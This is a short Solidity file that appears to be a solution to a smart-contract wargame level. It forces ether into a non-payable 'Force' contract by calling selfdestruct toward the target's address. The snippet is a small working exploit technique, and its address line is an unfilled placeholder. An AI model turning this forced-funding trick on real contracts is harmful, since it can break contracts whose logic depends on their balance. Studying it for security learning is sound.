/*

Here we need to use a subtle trick to force funds into Force contract

Usually a contract will not accept funds until ut has payable function, but this cannot stop anyone from sending it funds by selfdestructing the contract

*/

// === Solidity Code
// Deployed and Tested using Remix
// Run the FundForce contract and call the fundForce function, notice this is a payable function so add atleast 1 wei so that it then transfers this to Force

/*

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract FundForce {
  
  address to_address = addr; // address of your contract instance in console

  function fundForce() public payable {
    selfdestruct(payable(to_address));
  }
}
